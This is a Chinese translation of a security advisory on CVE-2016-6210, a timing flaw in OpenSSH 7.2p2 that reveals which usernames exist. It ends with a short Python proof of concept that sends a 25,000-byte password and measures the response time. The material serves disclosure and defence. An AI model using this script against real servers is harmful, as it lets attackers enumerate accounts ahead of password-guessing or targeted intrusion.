# OpenSSHD 用户枚举漏洞

## 译文声明
本文为翻译文章，原文来源：360安全播报。具体表达及含义以原文为准。

## 摘要
通过发送一个长密码，远程用户可以枚举在系统上运行 SSHD 的用户。此问题存在于大多数现代配置中，因为相比于计算 BLOWFISH 哈希散列，SHA256/SHA512 的计算耗时更长。
**CVE-ID: CVE-2016-6210**

## 测试版本
该问题已在 opensshd – 7.2 – p2 版本上进行了测试，预计也会影响更早的版本。

## 修复
OpenSSH 开发团队已报告此问题，并开发了修复补丁（但目前尚不清楚该补丁是否已发布）。特别感谢 'dtucker () zip com au' 的快速回复和解决方案建议。

## 详细信息
当 SSHD 尝试验证一个不存在的用户时，它会使用硬编码在源代码中的假密码结构。在这个假密码结构中，密码哈希基于 BLOWFISH 算法进行计算。对于真实有效的用户密码，则使用 SHA256/SHA512 进行哈希计算。由于 SHA256/SHA512 的哈希计算比 BLOWFISH 耗时更长，因此发送超过 10KB 的密码会导致对有效用户和无效用户的响应时间出现差异。

## 示例代码
```python
import paramiko
import time

user = input("请输入用户名: ")
password = 'A' * 25000  # 长度为 25000 字节的密码
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

start_time = time.time()
try:
    ssh.connect('127.0.0.1', username=user, password=password)
except Exception as e:
    end_time = time.time()

total_time = end_time - start_time
print(f"总时间: {total_time} 秒")

# 注意：如果 SSHD 配置禁止 root 登录，则 root 不被视为有效用户
# 如果启用了 TCP 时间戳选项，最佳方法是使用来自服务器的 TCP 数据包的时间戳来测量时间，以消除任何网络延迟
```

### 说明
- 对于有效用户，响应时间会更长。
- 如果 SSHD 配置禁止 root 登录，则 root 不被视为有效用户。
- 如果启用了 TCP 时间戳选项，使用来自服务器的 TCP 数据包的时间戳来测量时间可以消除网络延迟的影响。